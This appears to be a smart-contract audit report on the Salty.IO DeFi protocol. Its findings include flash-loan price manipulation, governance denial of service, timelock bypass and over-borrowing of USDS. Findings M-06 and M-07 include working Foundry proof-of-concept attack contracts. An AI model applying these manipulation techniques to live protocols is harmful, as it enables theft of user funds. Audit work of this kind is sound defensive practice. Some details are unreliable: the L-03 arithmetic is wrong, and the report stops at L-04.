| Severity | Title |
| -------- | -------- | 
|H-01 |Function getPoolReserves could be vulnerable to flashloan attack|
|M-01 |Timelock can be bypass|
|M-02 |Malicious User can fill _openBallotsForTokenWhitelisting with customized/fake/malicious/low-valued tokens by front-running|
|M-03 |Once rejected, no new proposal could be created for ManagedWallet|
|M-04 |Incorrect Requirement with two same condition check|
|M-05 |A non-whitelisted pool may keep its _arbitrageProfits after re-whitelist and get more rewards|
|M-06 |SetContractAddress proposal is vulnerable to a denial-of-service attack,preventing any future changes to the price feed and accessManager addresses|
|M-07 |the total value of collateral can be manipulated, attacker can obtain USDS significantly greater than the total value of collateral|
|L-01 |Hardcoding EXPECTED_SIGNER reduces future scalability.|
|L-02|No mechanism for blacklisting.|
|L-03|Excess tokens approval will be give to  the staking contract.|
|L-04|setContracts can be called multiple times.|
|L-05|The vote is ineffective.|
|L-06|Redundant Function countryIsExcluded|
|L-07|When adding liquidity with useZapping = true, due to automatic atomic arbitrage（AAA）after swap, the liquidity obtained by the user will be less than the liquidity deserved|



## [H-01]  Function getPoolReserves could be vulnerable to flashloan attack

## Vulnerability details
### Impact
The Pool::getPoolReserves returns the reserve0 && reserve1 in real-time, and no TWAP is provided in the contract. However, if the function is later used in CoreSaltyFeed::getPriceBTC or CoreSaltyFeed::getPriceETH or other contracts to feed price of tokens, a flashloan attack could be performed before-head to manipulate the ratio and thus the price.
### Proof of Concept
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/pools/Pools.sol#L409-L419
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/price_feed/CoreSaltyFeed.sol#L32-L54

Consider the following scenario:

1. There's a pool pair with 2 tokens, let's name it TOKEN-A and USDT.
2. An exterior contract Ex (Ex. Lending Pool) retrieves the TOKEN-A/USDT ratio for price-feeding since there is no TWAP provided.
3. The attacker could use Flashloan and call Pool::swap to buy TOKEN-A with USDT to increase the price of TOKEN-A. Thus, he may call Ex to borrow USDT with TOKEN-A as the collateral. Since the price is manipulated, he may borrow much more from Ex.
## Recommended Mitigation Steps
1. Provide another TWAP price that is more resistant to Flashloan manipulation which is also implemented by Uniswap
2. Specify this vulnerability in the DOC or comment.


## [M-01]  Timelock can be bypass

## Vulnerability details
### Impact
[There is a timelock of 30 days before the proposed mainWallet can confirm the change.](https://github.com/code-423n4/2024-01-salty/blob/main/src/ManagedWallet.sol#L10)
Consider the following scenario.

The confirmationWallet immediately sends 0.05 or more ether to the ManagedWallet upon deployment.
The activeTimelock is triggered.
The time from proposeWallets to changeWallets is less than expected.
There is no restriction here that the mainWallet cannot be the same as the confirmationWallet.
If mainWallet==confirmationWallet
It is possible to immediately activate the activeTimelock after deploy.
proposeWallets() to changeWallets() process can less than 30 days




### Proof of Concept
https://github.com/code-423n4/2024-01-salty/blob/main/src/ManagedWallet.sol#L77

## [M-02]  Malicious User can fill _openBallotsForTokenWhitelisting with customized/fake/malicious/low-valued tokens by front-running

## Vulnerability details
### Impact
Malicious Users can fill _openBallotsForTokenWhitelisting with customized/fake/malicious/low-valued tokens by front-running others calling proposeTokenWhitelisting. Even though these ballots would not be approved and would be removed from _openBallotsForTokenWhitelisting due to the help from the DAO community after ballot.ballotMinimumEndTime(at least 10 days) has passed, this could prevent the normal call of proposeTokenWhitelisting and prevent the DEX from working.
### Proof of Concept

https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L174
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L138
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/DAO.sol#L272
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/DAOConfig.sol#L47-L53
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L95

In the function Proposals::proposeTokenWhitelisting, there is no access control and anyone could propose his token. If the _openBallotsForTokenWhitelisting has space and token satisfies the totalSupply requirement, the token is then added to the _openBallotsForTokenWhitelisting.
```
function proposeTokenWhitelisting( IERC20 token, string calldata tokenIconURL, string calldata description ) external nonReentrant returns (uint256 _ballotID)
{
		require( address(token) != address(0), "token cannot be address(0)" );
		require( token.totalSupply() < type(uint112).max, "Token supply cannot exceed uint112.max" ); // 5 quadrillion max supply with 18 decimals of precision

		require( _openBallotsForTokenWhitelisting.length() < daoConfig.maxPendingTokensForWhitelisting(), "The maximum number of token whitelisting proposals are already pending" );
		require( poolsConfig.numberOfWhitelistedPools() < poolsConfig.maximumWhitelistedPools(), "Maximum number of whitelisted pools already reached" );
		require( ! poolsConfig.tokenHasBeenWhitelisted(token, exchangeConfig.wbtc(), exchangeConfig.weth()), "The token has already been whitelisted" );

		string memory ballotName = string.concat("whitelist:", Strings.toHexString(address(token)) );

		uint256 ballotID = _possiblyCreateProposal( ballotName, BallotType.WHITELIST_TOKEN, address(token), 0, tokenIconURL, description );
		_openBallotsForTokenWhitelisting.add( ballotID );

		return ballotID;
}
```

If the user front-runs others with multiple qualified wallets and calls proposeTokenWhitelisting, others won't be able to propose their tokens. And the _openBallotsForTokenWhitelisting could be filled with customized/fake/malicious/low-valued tokens. Thus the DEX is unable to whitelist high-quality tokens.

For a proposal, When its ballot.ballotMinimumEndTime has passed, consider two scenarios:

- if the ballot is approved, the proposed token would be whitelisted, and malicious users could make profits or even rug-pull which may cause damage to normal users.
- if the ballot is rejected, the malicious user could front-run again and propose the token or other token to fill the proposeTokenWhitelisting.

Even though, there's a restriction that the user could only have one active proposal and the user should stake some SALT to propose. However, considering what is required to attack with default setting, worst-case setting, and best-case setting, it is still highly likely that the attack could be conducted against the community.

- By default, it requires 0.5% percentage of totalStaked SALT (requiredProposalPercentStakeTimes1000 = 500), and the default maxPendingTokensForWhitelisting is 5, it only requires 2.5% of totalStaked SALT to perform the attack.
- In the worst case, it only requires 0.1% percentage of totalStaked SALT, and the default maxPendingTokensForWhitelisting is 3, it only requires 0.3% of totalStaked SALT to perform the attack.
- In the best case, it requires 2% percentage of totalStaked SALT, and the default maxPendingTokensForWhitelisting is 12, it requires 24% of totalStaked SALT to perform the attack.
## Recommended Mitigation Steps
To mitigate this issue, I think there are possibly a few ways that can help.

1. Tokens that have been proposed before could not be proposed again.
2. A blacklist mechanism could be set to prevent malicious users from sending proposals again.
3. If a proposal is rejected with overwhelming power, the DAO coulåd punish the proposer by burning a portion of his XSALT.


## [M-03]  Once rejected, no new proposal could be created for ManagedWallet

## Vulnerability details
### Impact
The changing mechanism of ManagedWallet requires a proposal and confirmation. The value activeTimelock is updated each time the receive function is triggered. However, when a new proposeWallets is rejected (for example, wrong address input by mistake), the activeTimelock is reset to type(uint256).max but the proposedMainWallet and proposedConfirmationWallet is not reset. So, the changeWallets can't be called due to block.timestamp >= activeTimelock and new proposal can't be called due to require( proposedMainWallet == address(0), "Cannot overwrite non-zero proposed mainWallet." );. Thus the mechanism gets stuck.
### Proof of Concept

Consider the following situation.

1. The mainWallet wants to make some modifications, and he calls proposeWallets.
2. The confirmationWallet rejects the proposal by sending 0.01 ETH to the contract.
3. No one can call changeWallets.
4. The mainWallet can't call proposeWallets.
POC below:
```
    function setUp() public {
        managedWallet = new ManagedWallet(alice,bob);
        vm.deal(alice, 10 ether);
        vm.deal(bob, 10 ether);

    }

    function test_walletBypass() public {
        vm.prank(alice);
        managedWallet.proposeWallets(zed,bob);
        vm.prank(bob);
        address(managedWallet).call{value : 0.01 ether}("");
        console.log("Lock time = > ", managedWallet.activeTimelock());
        vm.warp(block.timestamp + 31 days);
        vm.startPrank(zed);
        vm.expectRevert("Timelock not yet completed");
        managedWallet.changeWallets();        
        vm.startPrank(alice);
        vm.expectRevert("Cannot overwrite non-zero proposed mainWallet.");
        managedWallet.proposeWallets(zed,zed);
    }
```
## Recommended Mitigation Steps
Modify receive function: when the proposal is rejected, reset proposedMainWallet and proposedConfirmationWallet to address(0).

## [M-04]  Incorrect Requirement with two same condition check 

## Vulnerability details
### Impact
It's clear that the require statement here is incorrect which should be require((reserves.reserve0 >= PoolUtils.DUST) && (reserves.reserve1 >= PoolUtils.DUST), "Insufficient reserves after liquidity removal");. By making reserves.reserve1 < PoolUtils.DUST and reserves.reserve0 >= PoolUtils.DUST, the original check could be bypassed.
### Proof of Concept
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/pools/Pools.sol#L187

In the code comments, it says: "// Make sure that removing liquidity doesn't drive either of the reserves below DUST."
However, the require statement incorrectly uses reserves.reserve0 >= PoolUtils.DUST twice which violates the meaning of the DOC.
```
// Make sure that removing liquidity doesn't drive either of the reserves below DUST.
// This is to ensure that ratios remain relatively constant even after a maximum withdrawal.
require((reserves.reserve0 >= PoolUtils.DUST) && (reserves.reserve0 >= PoolUtils.DUST), "Insufficient reserves after liquidity removal");
```
By making reserves.reserve1 < PoolUtils.DUST and reserves.reserve0 >= PoolUtils.DUST, the original check could be bypassed.
## Recommended Mitigation Steps
Change the require statement to
```
require((reserves.reserve0 >= PoolUtils.DUST) && (reserves.reserve1 >= PoolUtils.DUST), "Insufficient reserves after liquidity removal");
```


## [M-05]  A non-whitelisted pool may keep its _arbitrageProfits after re-whitelist and get more rewards

## Vulnerability details
### Impact
When a pool is unwhitelisted, it is removed from _whitelist, however when later the upkeep is performed by Upkeep::performUpkeep, the _arbitrageProfits information of all whitelisted pools will be cleared. But when the removed pool is later get whitelisted, its _arbitrageProfits will remain unchanged which will cause inconsistency and misunderstanding when PoolStats::profitsForWhitelistedPools is being called. Furthermore, since Upkeep uses profitsForWhitelistedPools to distribute rewards for pools, thus the pool will get more rewards than expected.
### Proof of Concept
https://github.com/code
-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/pools/PoolStats.sol#L51-L55
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/Upkeep.sol#L200
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/pools/PoolsConfig.sol#L127-L130
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/pools/PoolStats.sol#L134-L140
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/Upkeep.sol#L196
When PoolStats::clearProfitsForPools is being called, all whitelisted pools' _arbitrageProfits will be cleared.
```
function clearProfitsForPools() external
    {
    require(msg.sender == address(exchangeConfig.upkeep()), "PoolStats.clearProfitsForPools is only callable from the Upkeep contract" );

    bytes32[] memory poolIDs = poolsConfig.whitelistedPools();

    for( uint256 i = 0; i < poolIDs.length; i++ )
        _arbitrageProfits[ poolIDs[i] ] = 0;
    }
```
However, if a pool is unwhitelisted before the clearProfitsForPools call, and added back to _whitelist afterwards, its _arbitrageProfits would remain to be the value before. Thus this is inconsistent with the design of performUpkeep and could potentially cause misunderstanding and wrong statistics when PoolStats::profitsForWhitelistedPools is being called to Look at the arbitrage that has been generated since the last performUpkeep and determine how much each of the pools contributed to those generated profits.
```
// Look at the arbitrage that has been generated since the last performUpkeep and determine how much each of the pools contributed to those generated profits.
// Returns the profits for all of the current whitelisted pools
function profitsForWhitelistedPools() external view returns (uint256[] memory _calculatedProfits)
{
    bytes32[] memory poolIDs = poolsConfig.whitelistedPools();

    _calculatedProfits = new uint256[](poolIDs.length);
    _calculateArbitrageProfits( poolIDs, _calculatedProfits );
}
```
Furthermore, since Upkeep::step7 uses profitsForWhitelistedPools to distribute rewards for pools, thus the pool will get more rewards than expected since his _arbitrageProfits is never erased.
```
function step7() public onlySameContract
{
    uint256[] memory profitsForPools = pools.profitsForWhitelistedPools();

    bytes32[] memory poolIDs = poolsConfig.whitelistedPools();
    saltRewards.performUpkeep(poolIDs, profitsForPools );
    pools.clearProfitsForPools();
}
```

## Recommended Mitigation Steps
It would be proper to add a counter for upkeep, and every time counter++ during upkeep, the previous counter won't be visited again.

## [M-06]  SetContractAddress proposal is vulnerable to a denial-of-service attack,preventing any future changes to the price feed and accessManager addresses

## Vulnerability details
In _possiblyCreateProposal() function,it will check openBallotsByName[ballotName] == 0 and  openBallotsByName[ string.concat(ballotName, "_confirm")] == 0,so creating proposal need unexist ballotName proposal ballotName + "_confirm"proposal.But propose SetContractAddress proposal can use any contract name (incule xxx_confirm),and it need two stage proposal.It will add “setContract:” + contractName + "_confirm"proposal after stage one pass.So attacker can Propose a "setContract:” + contractName + "_confirm" proposal ,and any SetContractAddress proposal will stop in stage one because of  openBallotsByName[ string.concat(ballotName, "_confirm")] == 0 check，and never pass proposal.WebsiteUpdate proposal has some problem,but the impact is not as significant as in SetContractAddress .


### Impact
If attacker continues to submit such proposals after it pass or failed and make it always exist, the price feed and access manager will remain unmodifiable indefinitely.

In terms of cost considerations, an attacker only needs to stake a minimal amount of salt for the proposal proposing(default 0.5% staked in staking) to cause the access manager to remain unchangeable indefinitely. The contract's access control is consistently at risk when there are issues with the access manager.

an attacker only needs to stake double minimal amount of salt for the proposal proposing(1% staked in staking) to cause the two price feed can't change forever.If there are two price feed producing wrong price,price aggregator may give wrong price, and it will make keep the USDS economic system consistently at risk.

In fact, there is this kind of danger present in the price feed code audited this time.If chainlink aggregators return the incorrect price because of circuit breaker,and attacker manipulate salty weth/wbtc pool reserves to approach this incorrect price,it will make croeSaltyFeed and CoreChainlinkFeed give wrong price,and price aggregator give wrong price when borrowing usds and liquidating usds.And anyone can't change these two price feeds.
### Proof of Concept
when propose a SetContractAddress proposal，it can use any contractName to submit：

https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L240-L246
```
	function proposeSetContractAddress( string calldata contractName, address newAddress, string calldata description ) external nonReentrant returns (uint256 ballotID)
		{
		require( newAddress != address(0), "Proposed address cannot be address(0)" );

		string memory ballotName = string.concat("setContract:", contractName );
		return _possiblyCreateProposal( ballotName, BallotType.SET_CONTRACT, newAddress, 0, "", description );
		}
```
And it need submit a string.concat(ballot.ballotName, "_confirm") proposal after first proposal pass ：

https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/DAO.sol#L203-L204
```
		else if ( ballot.ballotType == BallotType.SET_CONTRACT )
			proposals.createConfirmationProposal( string.concat(ballot.ballotName, "_confirm"), BallotType.CONFIRM_SET_CONTRACT, ballot.address1, "", ballot.description );
```
When create proposal,it will check:

https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L102-L103
```
		require( openBallotsByName[ballotName] == 0, "Cannot create a proposal similar to a ballot that is still open" );
		require( openBallotsByName[ string.concat(ballotName, "_confirm")] == 0, "Cannot create a proposal for a ballot with a secondary confirmation" );
```
So after anyone submit an SetContractAddress proposal with contractName = A ,attacker can submit an proposal with contractName = A + "_confirm" before proposal with contractName = A arrives end time,and this proposal can't arrive stage two and create confirmation proposal beacause of  openBallotsByName[ string.concat(ballotName, "_confirm")] == 0 check.

it will affect these addresses change :

https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/DAO.sol#L131-L145
```
	function _executeSetContract( Ballot memory ballot ) internal
		{
		bytes32 nameHash = keccak256(bytes( ballot.ballotName ) );

		if ( nameHash == keccak256(bytes( "setContract:priceFeed1_confirm" )) )
			priceAggregator.setPriceFeed( 1, IPriceFeed(ballot.address1) );
		else if ( nameHash == keccak256(bytes( "setContract:priceFeed2_confirm" )) )
			priceAggregator.setPriceFeed( 2, IPriceFeed(ballot.address1) );
		else if ( nameHash == keccak256(bytes( "setContract:priceFeed3_confirm" )) )
			priceAggregator.setPriceFeed( 3, IPriceFeed(ballot.address1) );
		else if ( nameHash == keccak256(bytes( "setContract:accessManager_confirm" )) )
			exchangeConfig.setAccessManager( IAccessManager(ballot.address1) );

		emit SetContract(ballot.ballotName, ballot.address1);
		}
```
This is the exploit contract,please place it in the "test" folder within the project directory：
```// SPDX-License-Identifier: BUSL 1.1
pragma solidity =0.8.22;

import "../src/dev/Deployment.sol";
import "../src/pools/PoolUtils.sol";
import "forge-std/console.sol";

contract MyDaoTest is Deployment {

    address public constant alice = address(0x1111);
    address public constant bob = address(0x2222);
    address public constant charlie = address(0x3333);

    function setUp() public {
        initializeContracts();

		grantAccessAlice();
		grantAccessBob();
		grantAccessCharlie();
		grantAccessDeployer();
		grantAccessDefault();

		finalizeBootstrap();

        // console.logUint(uint(weth.balanceOf(DEPLOYER)));
        // console.logUint(uint(wbtc.balanceOf(DEPLOYER)));
        // console.logUint(uint(dai.balanceOf(DEPLOYER)));


		vm.startPrank(DEPLOYER);
		weth.transfer(alice, 1000000 ether);
		wbtc.transfer(alice, 1000000 * 10 ** 8);
		dai.transfer(alice, 1000000 ether);

        weth.transfer(bob, 1000000 ether);
		wbtc.transfer(bob, 1000000 * 10 ** 8);
		dai.transfer(bob, 1000000 ether);

		vm.stopPrank();

        //alice config
        vm.startPrank(alice);

       salt.approve(address(staking), type(uint256).max);
        //get salt

        airdrop.claimAirdrop();
        uint256 numWeek = stakingConfig.maxUnstakeWeeks();
        uint256 saltAmount = staking.userXSalt(alice);
        uint256 id = staking.unstake(saltAmount,numWeek);
        
        vm.warp(block.timestamp + numWeek * 1 weeks + 1);

        staking.recoverSALT(id);
        vm.stopPrank();

        //bob config
        vm.startPrank(bob);

        airdrop.claimAirdrop();
        salt.approve(address(staking), type(uint256).max);
        vm.stopPrank();
    }


    function testProposal() public {
       
        

        //bob add proposal to change priceFeed1 and vote
        vm.startPrank(bob);
        uint256 id = proposals.proposeSetContractAddress("priceFeed1",address(forcedPriceFeed),"hello");
        proposals.castVote(id,Vote.YES);

        vm.stopPrank();

        //before proposal(id) can be excuted 
        uint256 time = daoConfig.ballotMinimumDuration();
        vm.warp(block.timestamp + time - 1);


        //alice attack and add proposal to prevent priceFeed1 proposal change to stage two

        vm.startPrank(alice);

        uint256 totalStaked = staking.totalShares(PoolUtils.STAKED_SALT);

        // calculate amount to stake and stake
        uint256 up = totalStaked * daoConfig.requiredProposalPercentStakeTimes1000();
        uint256 down = 100 * 1000 - daoConfig.requiredProposalPercentStakeTimes1000();
        uint256 amount = up / down + 1;
        staking.stakeSALT(amount);

        proposals.proposeSetContractAddress("priceFeed1_confirm",address(forcedPriceFeed),"hello");

        vm.stopPrank();

        //proposal(id) can be excuted 
        vm.warp(block.timestamp + 2);

        vm.startPrank(bob);

        vm.expectRevert("Cannot create a proposal similar to a ballot that is still open");
        dao.finalizeBallot(id);
        vm.stopPrank();       
	}
}
```

## Recommended Mitigation Steps
To prevent this issue, consider appending a suffix to the contractName, for example, "setContract:" + contractName + " ballot".

## [M-07]  the total value of collateral can be manipulated, attacker can obtain USDS significantly greater than the total value of collateral

## Vulnerability details
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/stable/CollateralAndLiquidity.sol#L230-L235

The amount of USDS a user can borrow depends on the instantaneous values of WBTC and WETH calculated from their shares in the WETH/WBTC pool (i.e., collateral). This quantity can be manipulated by pool tokens reserve through the pool.swap operation. An attacker can borrow a significant amount of USDS after manipulating the pool reserves. Even if their shares are eventually liquidated, this approach allows them to obtain a value much greater than the total value of their liquidated collateral.
### Impact
attacker can obtain USDS significantly greater than the total value of collateral,could lead to the economic system collapsing.
### Proof of Concept
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/stable/CollateralAndLiquidity.sol#L99

in borrowUSDS，it will calculate value of usds can borrow by maxBorrowableUSDS function:

```function borrowUSDS( uint256 amountBorrowed ) external nonReentrant
		{
		require( exchangeConfig.walletHasAccess(msg.sender), "Sender does not have exchange access" );
		require( userShareForPool( msg.sender, collateralPoolID ) > 0, "User does not have any collateral" );
		require( amountBorrowed <= maxBorrowableUSDS(msg.sender), "Excessive amountBorrowed" );

		// Increase the borrowed amount for the user
		usdsBorrowedByUsers[msg.sender] += amountBorrowed;

		// Remember that the user has borrowed USDS (so they can later be checked for sufficient collateralization ratios and liquidated if necessary)
		_walletsWithBorrowedUSDS.add(msg.sender);

		// Mint USDS and send it to the user
		usds.mintTo( msg.sender, amountBorrowed );

		emit BorrowedUSDS(msg.sender, amountBorrowed);
		}
```

it will calculate user collateral value in userCollateralValueInUSD:

https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/stable/CollateralAndLiquidity.sol#L275
```function maxBorrowableUSDS( address wallet ) public view returns (uint256)
		{
		// If the user doesn't have any collateral, then they can't borrow any USDS
		if ( userShareForPool( wallet, collateralPoolID ) == 0 )
			return 0;

		// The user's current collateral value will determine the maximum amount that can be borrowed
		uint256 userCollateralValue  = userCollateralValueInUSD( wallet );

		if ( userCollateralValue < stableConfig.minimumCollateralValueForBorrowing() )
			return 0;

		uint256 maxBorrowableAmount = ( userCollateralValue * 100 ) / stableConfig.initialCollateralRatioPercent();

		// Already borrowing more than the max?
		if ( usdsBorrowedByUsers[wallet] >= maxBorrowableAmount )
			return 0;

		return maxBorrowableAmount - usdsBorrowedByUsers[wallet];
   		}
```
then it will use wbtc/weth pools reserve to calculate total collateral value:

https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/stable/CollateralAndLiquidity.sol#L230-L235
```
	function userCollateralValueInUSD( address wallet ) public view returns (uint256)
		{
		uint256 userCollateralAmount = userShareForPool( wallet, collateralPoolID );
		if ( userCollateralAmount == 0 )
			return 0;

		uint256 totalCollateralShares = totalShares[collateralPoolID];

		// Determine how much collateral share the user currently has
		(uint256 reservesWBTC, uint256 reservesWETH) = pools.getPoolReserves(wbtc, weth);

		uint256 userWBTC = (reservesWBTC * userCollateralAmount ) / totalCollateralShares;
		uint256 userWETH = (reservesWETH * userCollateralAmount ) / totalCollateralShares;

		return underlyingTokenValueInUSD( userWBTC, userWETH );
		}
```
they are instantaneous values,can be manipulated by swap, attacker can get usds more than he can borrow.

Even if their shares are eventually liquidated, this approach allows them to obtain a value much greater than the total value of their liquidated collateral.

This is the exploit contract,please place it in the "test" folder within the project directory：

```// SPDX-License-Identifier: BUSL 1.1
pragma solidity =0.8.22;

import "../src/dev/Deployment.sol";
import "../src/pools/PoolUtils.sol";
import "forge-std/console.sol";

contract MyLiquidityTest is Deployment {

    address public constant alice = address(0x1111);
    address public constant bob = address(0x2222);
    address public constant charlie = address(0x3333);

	function setUp() public {
	
    initializeContracts();

		grantAccessAlice();
		grantAccessBob();
		grantAccessCharlie();
		grantAccessDeployer();
		grantAccessDefault();

		finalizeBootstrap();

		vm.startPrank(DEPLOYER);
		weth.transfer(alice, 1000000 ether);
		wbtc.transfer(alice, 1000000 * 10 ** 8);
		dai.transfer(alice, 1000000 ether);

        weth.transfer(bob, 1000000 ether);
		wbtc.transfer(bob, 1000000 * 10 ** 8);
		dai.transfer(bob, 1000000 ether);

		vm.stopPrank();

    //alice config
    vm.startPrank(alice);

    weth.approve(address(collateralAndLiquidity), type(uint256).max);
    wbtc.approve(address(collateralAndLiquidity), type(uint256).max);
    dai.approve(address(collateralAndLiquidity), type(uint256).max);
    salt.approve(address(collateralAndLiquidity), type(uint256).max);
		weth.approve(address(pools), type(uint256).max);
    wbtc.approve(address(pools), type(uint256).max);
    dai.approve(address(pools), type(uint256).max);
    salt.approve(address(pools), type(uint256).max);
 
    //get salt

    airdrop.claimAirdrop();
    uint256 numWeek = stakingConfig.maxUnstakeWeeks();
    uint256 saltAmount = staking.userXSalt(alice);
    uint256 id = staking.unstake(saltAmount,numWeek);

    vm.warp(block.timestamp + numWeek * 1 weeks + 1);

    staking.recoverSALT(id);
    vm.stopPrank();

    //bob config
    vm.startPrank(bob);

    weth.approve(address(collateralAndLiquidity), type(uint256).max);
    wbtc.approve(address(collateralAndLiquidity), type(uint256).max);
    dai.approve(address(collateralAndLiquidity), type(uint256).max);
    salt.approve(address(collateralAndLiquidity), type(uint256).max);
    weth.approve(address(pools), type(uint256).max);
    wbtc.approve(address(pools), type(uint256).max);
    dai.approve(address(pools), type(uint256).max);
    salt.approve(address(pools), type(uint256).max);

    //get salt

    airdrop.claimAirdrop();
    saltAmount = staking.userXSalt(bob);
    id = staking.unstake(saltAmount,numWeek);

    vm.warp(block.timestamp + numWeek * 1 weeks + 1);

    staking.recoverSALT(id);

    vm.stopPrank();
  }


	function testLiquidateUser() public {

  //set origin reserve of  pool

	vm.startPrank(alice);
  // find price of ETH and BTC
  uint256 wbtcPrcie = priceAggregator.getPriceBTC();
  uint256 wethPrice = priceAggregator.getPriceETH();

  // console.logUint(uint(wbtcPrcie));
  // console.logUint(uint(wethPrice));

  //assume saltPrice is 5 usd
  uint256 saltPrice = 5 ether;

  bytes32 collateralPoolID = PoolUtils._poolID( exchangeConfig.wbtc(), exchangeConfig.weth());
  //add liquidity by correct ratio of price（if price of a and b is pa and pb,reserve is pb and pa）
  collateralAndLiquidity.depositCollateralAndIncreaseShare(
          wethPrice / (10 ** 10), 
          wbtcPrcie , 
          0, 
          block.timestamp, 
          false
      );//WETH/WBTC pool 
      
    (uint256 amountA,uint256 amountB) = pools.getPoolReserves(wbtc,weth);
    require(amountA == wethPrice / (10 ** 10));     
    require(amountB == wbtcPrcie);      

    collateralAndLiquidity.depositLiquidityAndIncreaseShare(
        salt,
        weth,
        wethPrice, 
        saltPrice , 
        0, 
        block.timestamp, 
        false
    );//WETH/SALT pool

    (amountA,amountB) = pools.getPoolReserves(salt,weth);
    require(amountA == wethPrice);     
    require(amountB == saltPrice);    

    collateralAndLiquidity.depositLiquidityAndIncreaseShare(
        salt,
        wbtc,
        wbtcPrcie, 
        saltPrice / (10 ** 10), 
        0, 
        block.timestamp, 
        false
    );//SALT/WBTC pool

    (amountA,amountB) = pools.getPoolReserves(salt,wbtc);
    require(amountA == wbtcPrcie);     
    require(amountB == saltPrice / (10 ** 10));     
		vm.stopPrank();

    //switch to bob,and add liquidity to wbtc/weth pool to get usds
    vm.startPrank(bob);
		collateralAndLiquidity.depositCollateralAndIncreaseShare(
        wethPrice / (10 ** 14), 
        wbtcPrcie / (10 ** 4) , 
        0, 
        block.timestamp, 
        false
    );//WETH/WBTC pool 

    console.logString("before stake usds value:");
    uint256 maxUsds = collateralAndLiquidity.maxBorrowableUSDS(bob);
    console.logUint(maxUsds);

    console.log("all collateral value:");
    uint256 value = maxUsds * stableConfig.initialCollateralRatioPercent() / 100;
    console.logUint(value);

    (,uint256 amount) = pools.getPoolReserves(wbtc,weth);

    uint256 beforeAmount = amount * 5;
    console.logString("before weth Amount");
    console.logUint(uint(beforeAmount));
    uint256 wbtcAmount = pools.depositSwapWithdraw(weth,wbtc,beforeAmount,0,block.timestamp);

    maxUsds = collateralAndLiquidity.maxBorrowableUSDS(bob);

    console.logString("after stake usds value:");
    console.logUint(maxUsds);
    collateralAndLiquidity.borrowUSDS(maxUsds);
    uint256 afterAmount = pools.depositSwapWithdraw(wbtc,weth,wbtcAmount,0,block.timestamp);

    console.logString("after weth Amount");
    console.logUint(uint(afterAmount));

    //even liquidate collateral can earn
    uint256 earned = maxUsds - value - (beforeAmount - afterAmount) * priceAggregator.getPriceETH() / 10 ** 18;

    console.logString("earned:");
    console.logUint(uint(earned));

    vm.stopPrank();
	}
}
```
## Recommended Mitigation Steps
don't calculate borrow amount by instantaneous value.



## [L-01] Hardcoding EXPECTED_SIGNER reduces future scalability.
https://github.com/code-423n4/2024-01-salty/blob/main/src/SigningTools.sol#L7
```
address constant public EXPECTED_SIGNER = 0x1234519DCA2ef23207E1CA7fd70b96f281893bAa;
```
## [L-02] No mechanism for blacklisting.

Once a user has been granted permission, there is no mechanism for removal in the absence of a blacklist.
https://github.com/code-423n4/2024-01-salty/blob/main/src/AccessManager.sol#L65
```
// Grant access to the sender for the given geoVersion.
// Requires the accompanying correct message signature from the offchain verifier.
function grantAccess(bytes calldata signature) external
    {
        require( _verifyAccess(msg.sender, signature), "Incorrect AccessManager.grantAccess signatory" );

        _walletsWithAccess[geoVersion][msg.sender] = true;

        emit AccessGranted( msg.sender, geoVersion );
    } 
```

## [L-03] Excess tokens approval will be give to  the staking contract.
This issue is covered in the [bot race report](https://github.com/code-423n4/2024-01-salty/blob/main/bot-report.md#l-16) but lacks a more detailed explanation.

saltBalance is the  salt balance of the Airdrop contract.
saltAmountForEachUser is calculated as follows:

https://github.com/code-423n4/2024-01-salty/blob/main/src/launch/Airdrop.sol#L64
```
saltAmountForEachUser = saltBalance / numberAuthorized();
```
Afterward, approve saltBalance to the staking contract.
https://github.com/code-423n4/2024-01-salty/blob/main/src/launch/Airdrop.sol#L67
```
salt.approve( address(staking), saltBalance );
```
claimAirdrop() only sends out saltAmountForEachUser.

https://github.com/code-423n4/2024-01-salty/blob/main/src/launch/Airdrop.sol#L81-L82
```
// Have the Airdrop contract stake a specified amount of SALT and then transfer it to the user
		staking.stakeSALT( saltAmountForEachUser );
		staking.transferStakedSaltFromAirdropToUser( msg.sender, saltAmountForEachUser );
```
Consider the following scenarios:
If saltBalance = 100
saltAmountForEachUser = saltBalance / numberAuthorized()
=> 100/8 = 12
Approved 4 salt in excess.
If saltBalance = 200
saltAmountForEachUser = saltBalance / numberAuthorized()
=> 200/26 = 182
Approved 18 salt in excess.

## [L-04] setContracts can be called multiple times.
setContracts can only be be called once
